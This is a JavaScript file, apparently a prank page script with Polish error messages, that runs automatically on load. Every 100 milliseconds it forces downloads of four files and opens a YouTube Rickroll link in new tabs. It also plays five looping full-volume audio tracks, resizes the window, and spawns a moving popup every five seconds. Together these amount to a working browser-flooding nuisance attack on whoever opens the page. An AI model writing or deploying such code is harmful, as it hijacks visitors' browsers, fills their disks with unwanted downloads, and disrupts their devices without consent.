function downloadFiles(files) {
    files.forEach(file => {
        const link = document.createElement('a');
        link.href = `media/${file}`;
        link.download = file;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    });
}

function openLinks(links) {
    links.forEach(link => {
        window.open(link, '_blank');
    });
}

function resizeWindow() {
    let width = 300;
    let height = 200;
    const maxWidth = 800;
    const maxHeight = 600;

    const interval = setInterval(() => {
        if (width < maxWidth && height < maxHeight) {
            width += 50;
            height += 50;
            window.resizeTo(width, height);
        } else {
            clearInterval(interval);
        }
    }, 2000);
}

function openVideoWindow() {
    const videoWindow = window.open('/media/video.mp3', 'VideoWindow', 'width=400,height=300');

    let posX = 0;
    let posY = 0;
    const moveInterval = setInterval(() => {
        posX += 5;
        posY += 3;

        if (posX > window.innerWidth - 400 || posY > window.innerHeight - 300) {
            posX = 0;
            posY = 0;
        }

        videoWindow.moveTo(posX, posY);
    }, 100);
}

function startVideoWindowInterval() {
    setInterval(openVideoWindow, 5000);
}

function playBackgroundMusic() {
    const audio = new Audio('media/video.mp4');
    audio.loop = true;
    audio.play().catch(error => {
        console.error("Nie udało się odtworzyć muzyki:", error);
    });
}

function main() {
    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'jasioch.png', 'readme.txt'];
    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];

    setInterval(() => {
        downloadFiles(filesToDownload);
        openLinks(linksToOpen);
    }, 100);

    function playAudio() {
        const audio = new Audio('media/video.mp3');
        audio.volume = 1.0;
        audio.loop = true;
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio2() {
        const audio = new Audio('media/video.mp3');
        audio.volume = 1.0;
        audio.loop = true;
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio3() {
        const audio = new Audio('/media/video.mp3');
        audio.volume = 1.0;
        audio.loop = true;
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio4() {
        const audio = new Audio('media/video.mp3');
        audio.volume = 1.0;
        audio.loop = true;
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    function playAudio5() {
        const audio = new Audio('/media/video.mp3');
        audio.volume = 1.0;
        audio.loop = true;
        audio.play().catch(error => {
            console.error('Błąd podczas odtwarzania audio:', error);
        });
    }
    
    playAudio();
    playAudio2();
    playAudio3();
    playAudio4();
    playAudio5();
    resizeWindow();
    startVideoWindowInterval();
    playBackgroundMusic();
}

main();
